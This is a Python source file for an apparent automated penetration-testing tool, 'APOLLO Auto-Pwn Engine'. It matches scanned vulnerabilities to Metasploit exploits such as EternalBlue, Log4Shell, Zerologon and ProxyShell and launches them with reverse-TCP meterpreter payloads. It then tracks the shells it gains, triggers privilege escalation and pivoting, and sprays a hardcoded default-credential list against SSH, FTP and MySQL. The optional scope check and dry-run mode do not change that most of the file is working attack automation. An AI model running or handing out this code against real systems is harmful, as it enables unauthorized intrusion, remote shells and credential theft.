#!/usr/bin/env python3
"""
APOLLO Auto-Pwn Engine v2 - Autonomous exploitation via Metasploit RPC.
Reads KB vulnerabilities, matches to exploit catalog, executes via
pymetasploit3 RPC, tracks sessions, and triggers post-exploit actions.
Now uses actual RPC exploitation instead of msfconsole shell commands.
"""
import sys, os, json, subprocess, re, hashlib, time, threading, tempfile
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import (init_db, get_connection, get_active_project,
                        get_project_id, create_project, create_event,
                        log_command, add_c2_session, add_host, add_credential,
                        add_vulnerability, add_attack_path, get_hosts)

try:
    from apollo_core.safety import preflight as _preflight
    from apollo_core.scope import is_safe_shell_token
    _CORE_AVAILABLE = True
except Exception:  # pragma: no cover - module still runs without core
    _CORE_AVAILABLE = False

    def is_safe_shell_token(_token):
        return True

EXPLOIT_CATALOG = [
    {
        "id": "ms17-010",
        "name": "EternalBlue (MS17-010)",
        "match": {"cve": r"CVE-2017-014[0-9]", "service": r"microsoft-ds|smb"},
        "mitre": "T1210",
        "reliability": 0.9,
        "severity": "critical",
        "msf_module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "check_cmd": "nmap -p445 --script smb-vuln-ms17-010 {ip}",
    },
    {
        "id": "cve-2021-44228",
        "name": "Log4Shell (CVE-2021-44228)",
        "match": {"cve": r"CVE-2021-44228", "name": r"log4j|log4shell"},
        "mitre": "T1190",
        "reliability": 0.85,
        "severity": "critical",
        "msf_module": "exploit/multi/http/log4shell_header_injection",
        "payload": "java/meterpreter/reverse_tcp",
        "check_cmd": "nuclei -t ~/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u {url}",
    },
    {
        "id": "cve-2017-5638",
        "name": "Apache Struts RCE (CVE-2017-5638)",
        "match": {"cve": r"CVE-2017-5638", "name": r"struts"},
        "mitre": "T1190",
        "reliability": 0.9,
        "severity": "critical",
        "msf_module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "check_cmd": "nuclei -t ~/nuclei-templates/cves/2017/CVE-2017-5638.yaml -u {url}",
    },
    {
        "id": "cve-2019-0708",
        "name": "BlueKeep (CVE-2019-0708)",
        "match": {"cve": r"CVE-2019-0708", "name": r"bluekeep"},
        "mitre": "T1210",
        "reliability": 0.7,
        "severity": "critical",
        "msf_module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "check_cmd": "nmap -p3389 --script rdp-vuln-cve-2019-0708 {ip}",
    },
    {
        "id": "cve-2020-1472",
        "name": "Zerologon (CVE-2020-1472)",
        "match": {"cve": r"CVE-2020-1472", "name": r"zerologon"},
        "mitre": "T1210",
        "reliability": 0.8,
        "severity": "critical",
        "msf_module": "exploit/windows/dcerpc/cve_2020_1472_zerologon",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "check_cmd": "crackmapexec smb {ip} -u '' -p '' -M zerologon",
    },
    {
        "id": "shellshock",
        "name": "Shellshock (CVE-2014-6271)",
        "match": {"cve": r"CVE-2014-6271|CVE-2014-7169", "name": r"shellshock"},
        "mitre": "T1190",
        "reliability": 0.85,
        "severity": "critical",
        "msf_module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "check_cmd": "nuclei -t ~/nuclei-templates/cves/2014/CVE-2014-6271.yaml -u {url}",
    },
    {
        "id": "samba-rce",
        "name": "Samba username map (CVE-2007-2447)",
        "match": {"cve": r"CVE-2007-2447", "service": r"smb|samba"},
        "mitre": "T1210",
        "reliability": 0.85,
        "severity": "critical",
        "msf_module": "exploit/multi/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "check_cmd": "nmap -p139 --script smb-vuln-usermap-script {ip}",
    },
    {
        "id": "drupalgeddon2",
        "name": "Drupalgeddon2 (CVE-2018-7600)",
        "match": {"cve": r"CVE-2018-7600", "name": r"drupal"},
        "mitre": "T1190",
        "reliability": 0.85,
        "severity": "critical",
        "msf_module": "exploit/unix/webapp/drupal_drupalgeddon2",
        "payload": "php/meterpreter/reverse_tcp",
        "check_cmd": "curl -s http://{ip}/user/register",
    },
    {
        "id": "jenkins-rce",
        "name": "Jenkins Script Console RCE",
        "match": {"service": r"http", "name": r"jenkins"},
        "mitre": "T1059",
        "reliability": 0.8,
        "severity": "critical",
        "msf_module": "exploit/multi/http/jenkins_script_console",
        "payload": "java/jsp_shell_reverse_tcp",
        "check_cmd": "curl -s http://{ip}:8080/script",
    },
    {
        "id": "tomcat-manager",
        "name": "Tomcat Manager Deploy",
        "match": {"service": r"http", "name": r"tomcat.*manager|tomcat.*default"},
        "mitre": "T1190",
        "reliability": 0.7,
        "severity": "high",
        "msf_module": "exploit/multi/http/tomcat_mgr_deploy",
        "payload": "java/meterpreter/reverse_tcp",
        "check_cmd": "curl -s http://{ip}:8080/manager/html",
    },
    {
        "id": "redis-unauth",
        "name": "Redis Unauthenticated + Cron RCE",
        "match": {"service": r"^redis$", "name": r"unauth|no password"},
        "mitre": "T1190",
        "reliability": 0.75,
        "severity": "high",
        "msf_module": "exploit/linux/redis/redis_replication_cmd_exec",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "check_cmd": "redis-cli -h {ip} ping",
    },
    {
        "id": "mysql-root",
        "name": "MySQL Root Login + UDF",
        "match": {"service": r"^mysql$", "name": r"root.*no password|weak"},
        "mitre": "T1068",
        "reliability": 0.65,
        "severity": "high",
        "msf_module": "exploit/multi/mysql/mysql_udf_payload",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "check_cmd": "mysql -h {ip} -u root -e 'select version();'",
    },
    {
        "id": "spring4shell",
        "name": "Spring4Shell (CVE-2022-22965)",
        "match": {"cve": r"CVE-2022-22965", "name": r"spring"},
        "mitre": "T1190",
        "reliability": 0.75,
        "severity": "critical",
        "msf_module": "exploit/multi/http/spring4shell",
        "payload": "java/meterpreter/reverse_tcp",
        "check_cmd": "nuclei -t ~/nuclei-templates/cves/2022/CVE-2022-22965.yaml -u {url}",
    },
    {
        "id": "proxyshell",
        "name": "Microsoft Exchange ProxyShell",
        "match": {"cve": r"CVE-2021-34473", "name": r"proxyshell|exchange"},
        "mitre": "T1190",
        "reliability": 0.8,
        "severity": "critical",
        "msf_module": "exploit/windows/http/exchange_proxyshell_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "check_cmd": "curl -s https://{ip}/autodiscover/autodiscover.json",
    },
    {
        "id": "confluence-ognl",
        "name": "Confluence OGNL RCE (CVE-2022-26134)",
        "match": {"cve": r"CVE-2022-26134", "name": r"confluence"},
        "mitre": "T1190",
        "reliability": 0.85,
        "severity": "critical",
        "msf_module": "exploit/multi/http/confluence_ognl_injection",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "check_cmd": "curl -s http://{ip}/$%7B1%2B1%7D/",
    },
    {
        "id": "anon-ftp",
        "name": "Anonymous FTP Access",
        "match": {"service": r"^ftp$", "banner": r"anonymous|Anonymous login"},
        "mitre": "T1078",
        "reliability": 0.6,
        "severity": "low",
        "msf_module": None,
        "payload": None,
        "check_cmd": "ftp -n {ip} <<EOF\nuser anonymous a@\nls\nbye\nEOF",
    },
    {
        "id": "smb-null",
        "name": "SMB Null Session",
        "match": {"service": r"microsoft-ds|smb", "name": r"null session|anonymous"},
        "mitre": "T1078",
        "reliability": 0.7,
        "severity": "medium",
        "msf_module": None,
        "payload": None,
        "check_cmd": "crackmapexec smb {ip} -u '' -p '' --shares",
    },
    {
        "id": "ssh-default",
        "name": "SSH Default Credentials",
        "match": {"service": r"^ssh$", "name": r"default cred|weak password"},
        "mitre": "T1110",
        "reliability": 0.5,
        "severity": "high",
        "msf_module": "auxiliary/scanner/ssh/ssh_login",
        "payload": None,
        "check_cmd": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {ip} ssh -t 4",
    },
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("administrator", "administrator"), ("guest", "guest"),
    ("postgres", "postgres"), ("mysql", "mysql"), ("sa", "sa"),
    ("tomcat", "tomcat"), ("user", "user"), ("test", "test"),
    ("backup", "backup"), ("operator", "operator"), ("cisco", "cisco"),
]


def _get_lhost():
    try:
        r = subprocess.run("ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \\K[0-9.]+'",
                           shell=True, capture_output=True, text=True, timeout=5)
        ip = r.stdout.strip()
        return ip if ip else "127.0.0.1"
    except Exception:
        return "127.0.0.1"


def _get_msf_client():
    """Get pymetasploit3 RPC client (fast path). Falls back to msfconsole shell."""
    from tool_registry import msf_available
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        user = os.environ.get("MSFRPCD_USER", "msf")
        pw = os.environ.get("MSFRPCD_PASS", "msf")
        host = os.environ.get("MSFRPCD_HOST", "127.0.0.1")
        port = int(os.environ.get("MSFRPCD_PORT", "55552"))
        return MsfRpcClient(pw, user=user, server=host, port=port, ssl=False)
    except ImportError:
        return None
    except Exception:
        return None


def _msf_console_exploit(entry, ip, lhost, lport, dry_run, port, timeout=180):
    """Execute exploitation via msfconsole resource script (robust fallback)."""
    import tempfile
    resource_lines = []
    resource_lines.append(f"use {entry['msf_module']}")
    resource_lines.append(f"set RHOSTS {ip}")
    resource_lines.append(f"set PAYLOAD {entry['payload']}")
    resource_lines.append(f"set LHOST {lhost}")
    resource_lines.append(f"set LPORT {lport}")
    if port:
        resource_lines.append(f"set RPORT {port}")
    resource_lines.append("set EXITONSESSION false")
    resource_lines.append(f"{'check' if dry_run else 'run -z -j'}")
    resource_lines.append("exit")
    rc_content = "\n".join(resource_lines)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(rc_content)
        rc_path = f.name

    cmd = f"msfconsole -q -r {rc_path} 2>&1"
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
        out = (proc.stdout + proc.stderr).decode("utf-8", errors="ignore")[:4000]
        result = {"command": cmd, "output": out, "success": False, "session_id": None, "exit_code": proc.returncode}
        success_markers = ["meterpreter", "session", "opened", "[+]", "command shell"]
        result["success"] = any(m.lower() in out.lower() for m in success_markers)
        sm = re.search(r"session (\d+) opened", out, re.IGNORECASE)
        if sm:
            result["session_id"] = sm.group(1)
        os.unlink(rc_path)
        return result
    except subprocess.TimeoutExpired:
        os.unlink(rc_path)
        return {"command": cmd, "output": "TIMEOUT", "success": False, "session_id": None}
    except Exception as e:
        os.unlink(rc_path)
        return {"command": cmd, "output": str(e), "success": False, "session_id": None}
    return {"success": False, "output": "msfconsole not available"}


def _match_vuln(vuln, entry):
    match = entry["match"]
    for field, pattern in match.items():
        val = ""
        if field == "cve":
            val = vuln.get("cve_id", "") or ""
        elif field == "name":
            val = (vuln.get("name", "") or "").lower()
        elif field == "service":
            val = (vuln.get("service", "") or "").lower()
        elif field == "banner":
            val = (vuln.get("evidence", "") or "").lower()
        if not re.search(pattern, val, re.IGNORECASE):
            return False
    return True


def _match_port(port, entry):
    match = entry["match"]
    service = (port.get("service", "") or "").lower()
    banner = (port.get("banner", "") or "").lower()
    for field, pattern in match.items():
        if field == "service" and not re.search(pattern, service, re.IGNORECASE):
            return False
        if field == "banner" and not re.search(pattern, banner, re.IGNORECASE):
            return False
    return True


def find_exploits(project_id):
    """Match KB vulns and open ports to exploit catalog."""
    init_db()
    conn = get_connection()
    vulns = [dict(r) for r in conn.execute("""
        SELECT v.*, h.ip, h.hostname, h.id as host_id FROM vulnerabilities v
        JOIN hosts h ON v.host_id = h.id WHERE h.project_id=?
    """, (project_id,)).fetchall()]
    ports = [dict(r) for r in conn.execute("""
        SELECT p.*, h.ip, h.hostname, h.project_id FROM ports p
        JOIN hosts h ON p.host_id = h.id WHERE h.project_id=? AND p.state='open'
    """, (project_id,)).fetchall()]

    opportunities = []
    for vuln in vulns:
        for entry in EXPLOIT_CATALOG:
            if _match_vuln(vuln, entry):
                opp = {"type": "vuln", "vuln_id": vuln["id"], "host_id": vuln["host_id"],
                       "ip": vuln["ip"], "hostname": vuln.get("hostname", ""),
                       "vuln_name": vuln["name"], "cve": vuln.get("cve_id", ""),
                       "exploit": entry,
                       "score": entry["reliability"] * {"critical": 1.0, "high": 0.8,
                               "medium": 0.5, "low": 0.3}.get(entry["severity"], 0.4)}
                # Add URL for HTTP-based exploits
                opp["url"] = f"http://{vuln['ip']}"
                opportunities.append(opp)

    for port in ports:
        for entry in EXPLOIT_CATALOG:
            if _match_port(port, entry) and entry["id"] in (
                "anon-ftp", "smb-null", "ssh-default", "mysql-root",
                "tomcat-manager", "redis-unauth"):
                if not any(o["exploit"]["id"] == entry["id"] and o["ip"] == port["ip"]
                           for o in opportunities):
                    opp = {"type": "service", "host_id": port["host_id"],
                           "ip": port["ip"], "hostname": port.get("hostname", ""),
                           "port": port["port"], "service": port.get("service", ""),
                           "exploit": entry, "score": entry["reliability"] * 0.6}
                    opp["url"] = f"http://{port['ip']}:{port['port']}"
                    opportunities.append(opp)

    opportunities.sort(key=lambda x: x["score"], reverse=True)
    return opportunities


def attempt_exploit_rpc(opportunity, lhost=None, lport=4444, dry_run=True, timeout=120):
    """Attempt exploitation via pymetasploit3 RPC. Falls back to msfconsole natively."""
    from tool_registry import msf_available
    entry = opportunity["exploit"]
    ip = opportunity["ip"]

    # --- Safety gate: exploitation is intrusive -------------------------------
    # Checked before anything else runs (even local LHOST discovery): refuse
    # out-of-scope/unauthorized targets and targets with shell metacharacters
    # (ip is interpolated into shell/MSF commands). A global APOLLO_DRY_RUN
    # forces check-only mode even if the caller asked to run.
    if not is_safe_shell_token(str(ip)):
        return {"exploit": entry["name"], "target": ip, "success": False,
                "dry_run": dry_run, "blocked": True,
                "reason": "target contains unsafe shell characters"}
    if _CORE_AVAILABLE:
        gate = _preflight("auto_pwn_exploit", target=str(ip), intrusive=True)
        if not gate.allowed:
            return {"exploit": entry["name"], "target": ip, "success": False,
                    "dry_run": dry_run, "blocked": True, "reason": gate.reason}
        if gate.dry_run:
            dry_run = True

    lhost = lhost or _get_lhost()
    result = {"exploit": entry["name"], "target": ip, "dry_run": dry_run,
              "command": "", "output": "", "success": False, "session_id": None}

    if not entry.get("msf_module"):
        # Non-MSF exploit: run check via shell
        fmt = {"ip": ip, "lhost": lhost, "lport": lport, "url": opportunity.get("url", f"http://{ip}"),
               "port": str(opportunity.get("port", ""))}
        cmd = entry["check_cmd"].format(**fmt) if dry_run else entry.get("exploit_cmd", entry["check_cmd"]).format(**fmt)
        result["command"] = cmd
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
            out = (proc.stdout + proc.stderr).decode("utf-8", errors="ignore")[:3000]
            result["output"] = out
            success_markers = ["meterpreter", "session 1 opened", "command shell",
                               "uid=0", "root", "NT AUTHORITY\\SYSTEM", "Login Success"]
            if any(m.lower() in out.lower() for m in success_markers):
                result["success"] = True
        except Exception as e:
            result["output"] = str(e)
        _record_and_log(opportunity, entry, result, ip)
        return result

    # MSF module exploitation - try RPC first, then native msfconsole
    rpc_success = False
    try:
        client = _get_msf_client()
        if client:
            cid = client.consoles.console()[b"id"].decode() if hasattr(client.consoles, 'console') else None
            if cid:
                console = client.consoles.console(cid)
                console.write(f"use {entry['msf_module']}")
                console.write(f"set RHOSTS {ip}")
                if opportunity.get('port'):
                    console.write(f"set RPORT {opportunity['port']}")
                console.write(f"set LHOST {lhost}")
                console.write(f"set LPORT {lport}")
                if entry.get("payload"):
                    console.write(f"set PAYLOAD {entry['payload']}")
                console.write("check" if dry_run else "run -z -j")
                time.sleep(3)
                data = console.read()
                out = str(data.get(b"data", b"").decode("utf-8", errors="ignore"))
                console.destroy()
                result["command"] = f"use {entry['msf_module']}; set RHOSTS {ip}; run"
                result["output"] = out[:3000]
                success_markers = ["meterpreter", "session 1 opened", "command shell", "[+]", "The target is vulnerable"]
                result["success"] = any(m.lower() in out.lower() for m in success_markers)
                sm = re.search(r"session (\d+) opened", out, re.IGNORECASE)
                if sm: result["session_id"] = sm.group(1)
                rpc_success = True
    except Exception:
        pass

    # Fallback to native msfconsole (always available on Kali)
    if not rpc_success and msf_available():
        msf_result = _msf_console_exploit(entry, ip, lhost, lport, dry_run,
                                          opportunity.get('port', ''), timeout)
        result["command"] = msf_result.get("command", result["command"])
        result["output"] = f"(msfconsole) {msf_result.get('output', '')}"
        result["success"] = msf_result.get("success", False)
        result["session_id"] = msf_result.get("session_id")

    _record_and_log(opportunity, entry, result, ip)

    # On success: track session, add attack path, trigger post-exploit
    if result["success"] and not dry_run:
        pid = get_project_id()
        hid = opportunity.get("host_id") or add_host(pid, ip)
        sid_val = result.get("session_id", f"auto_{entry['id']}_{ip}")
        add_c2_session(hid, "meterpreter" if entry.get("payload", "").endswith("meterpreter") else "shell",
                       sid_val, "", "", lhost, lport)
        add_attack_path(pid, lhost, ip, entry['name'], mitre_id=entry.get('mitre', ''),
                        service_used=entry.get('id', ''), description=f"Auto-pwned via {entry['name']}")
        create_event(pid, "session", "auto_pwn",
                     f"SESSION GAINED: {ip} via {entry['name']}",
                     {"ip": ip, "exploit": entry["name"], "session": sid_val}, "critical")
    return result


def _record_and_log(opportunity, entry, result, ip):
    conn = get_connection()
    conn.execute("""INSERT INTO exploits
        (vulnerability_id, edb_id, name, module_path, payload, target, success)
        VALUES (?,?,?,?,?,?,?)""",
        (opportunity.get("vuln_id"), entry.get("id"), entry["name"],
         entry.get("msf_module"), entry.get("payload"), ip,
         1 if result["success"] else 0))
    conn.commit()
    pid = get_project_id()
    create_event(pid, "exploit_attempt", "auto_pwn",
                 f"{'SUCCESS' if result['success'] else 'FAILED'}: {entry['name']} on {ip}",
                 {"exploit": entry["name"], "ip": ip, "success": result["success"],
                  "dry_run": result["dry_run"], "session": result.get("session_id")},
                 "critical" if result["success"] else "info")
    log_command(pid, result.get("command", ""), "auto_pwn", ip,
                result["output"][:500], 0 if result["success"] else -1)


def auto_pwn(project_id=None, lhost=None, lport=4444, dry_run=True,
             max_attempts=20, min_score=0.3):
    """Full autonomous exploitation run."""
    project_id = project_id or get_project_id()
    init_db()
    create_event(project_id, "auto_pwn_start", "auto_pwn",
                 f"Starting auto-pwn (dry_run={dry_run}, max={max_attempts})",
                 {"dry_run": dry_run}, "info")
    opportunities = find_exploits(project_id)
    opportunities = [o for o in opportunities if o["score"] >= min_score][:max_attempts]
    results = []
    for i, opp in enumerate(opportunities):
        print(f"[{i+1}/{len(opportunities)}] {opp['exploit']['name']} -> {opp['ip']} (score={opp['score']:.2f})")
        r = attempt_exploit_rpc(opp, lhost, lport, dry_run)
        results.append(r)
        if r["success"] and not dry_run:
            print(f"  [+] SESSION GAINED on {opp['ip']}!")
            # Trigger post-exploit: extract creds, recompute graph
            _post_exploit_collect(opp["ip"], r.get("session_id"))
        elif dry_run and r["success"]:
            print(f"  [~] VULNERABLE (check confirmed) on {opp['ip']}")

    successes = sum(1 for r in results if r["success"])
    summary = {"project_id": project_id, "opportunities_found": len(opportunities),
               "attempts": len(results), "successes": successes, "dry_run": dry_run,
               "results": [{"exploit": r["exploit"], "target": r["target"],
                            "success": r["success"], "session": r.get("session_id")} for r in results]}
    create_event(project_id, "auto_pwn_complete", "auto_pwn",
                 f"Auto-pwn: {successes}/{len(results)} successful",
                 summary, "critical" if successes else "info")
    return summary


def _post_exploit_collect(ip, session_id):
    """Post-exploit collection: extract creds, run privesc, add path."""
    if not session_id:
        return
    pid = get_project_id()
    create_event(pid, "post_exploit", "auto_pwn",
                 f"Post-exploit collection on {ip} session {session_id}",
                 {"ip": ip, "session": session_id}, "info")
    # Launch c2_commander auto_privesc and pivot detection in background
    try:
        c2_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_commander.py")
        subprocess.Popen([sys.executable, c2_script, "privesc", session_id, "auto"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen([sys.executable, c2_script, "pivot", session_id, "auto"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def suggest_default_creds(project_id):
    init_db()
    conn = get_connection()
    ports = [dict(r) for r in conn.execute("""
        SELECT p.*, h.ip FROM ports p JOIN hosts h ON p.host_id=h.id
        WHERE h.project_id=? AND p.state='open'
    """, (project_id,)).fetchall()]
    cred_services = {"ssh": 22, "telnet": 23, "ftp": 21, "mysql": 3306,
                     "postgresql": 5432, "mssql": 1433, "redis": 6379,
                     "microsoft-ds": 445, "winrm": 5985, "vnc": 5900,
                     "http": 80, "https": 443}
    targets = []
    for p in ports:
        svc = (p.get("service", "") or "").lower()
        for sname, sport in cred_services.items():
            if sname in svc or p["port"] == sport:
                targets.append({"ip": p["ip"], "port": p["port"],
                                "service": svc, "creds": DEFAULT_CREDS})
    return targets


def auto_spray_defaults(project_id, timeout=60):
    """Auto-spray default creds against all eligible services."""
    targets = suggest_default_creds(project_id)
    results = []
    for t in targets:
        ip = t["ip"]
        svc = t["service"]
        for user, pw in t["creds"][:5]:  # Try top 5 per service
            if "ssh" in svc:
                cmd = f"sshpass -p '{pw}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{ip} id 2>&1"
            elif "ftp" in svc:
                cmd = f"curl -s -u {user}:{pw} ftp://{ip}/ 2>&1"
            elif "mysql" in svc:
                cmd = f"mysql -h {ip} -u {user} -p'{pw}' -e 'select 1' 2>&1"
            else:
                continue
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
                out = (r.stdout + r.stderr).decode()[:500]
                success = r.returncode == 0
                if success:
                    add_credential(None, svc, user, pw, source="auto_spray")
                    results.append({"ip": ip, "service": svc, "username": user, "success": True})
            except Exception:
                pass
    pid = get_project_id()
    create_event(pid, "auto_spray", "auto_pwn",
                 f"Default cred spray: {sum(1 for r in results if r['success'])} successes on {len(targets)} targets",
                 {"results": results}, "high")
    return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("APOLLO Auto-Pwn Engine v2 (RPC-based)")
        print("Usage:")
        print(f"  {sys.argv[0]} find [project]          - Find exploit opportunities")
        print(f"  {sys.argv[0]} check [project]         - Dry-run RPC checks")
        print(f"  {sys.argv[0]} exploit [project] [lh] [lp] - Live exploitation via RPC")
        print(f"  {sys.argv[0]} creds [project]         - Suggest default cred targets")
        print(f"  {sys.argv[0]} spray [project]         - Auto-spray default creds")
        sys.exit(0)
    action = sys.argv[1]
    pid = get_project_id(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].count(".") == 3 else get_project_id()
    lh = None; lp = 4444
    for a in sys.argv[2:]:
        if a.count(".") == 3: lh = a
        if a.isdigit(): lp = int(a)
    if action == "find":
        opps = find_exploits(pid)
        print(f"Found {len(opps)} exploit opportunities:\n")
        for o in opps:
            print(f"  [{o['score']:.2f}] {o['exploit']['name']:40s} {o['ip']:16s} {o.get('cve','')}")
    elif action in ("check", "dry"):
        print(json.dumps(auto_pwn(pid, lh, lp, dry_run=True), indent=2, default=str))
    elif action == "exploit":
        print(json.dumps(auto_pwn(pid, lh, lp, dry_run=False), indent=2, default=str))
    elif action == "creds":
        targets = suggest_default_creds(pid)
        print(f"Default-cred targets: {len(targets)}")
        for t in targets:
            print(f"  {t['ip']}:{t['port']} ({t['service']}) - {len(t['creds'])} cred pairs")
    elif action == "spray":
        results = auto_spray_defaults(pid)
        print(json.dumps(results, indent=2, default=str))
    else:
        print(f"Unknown action: {action}")
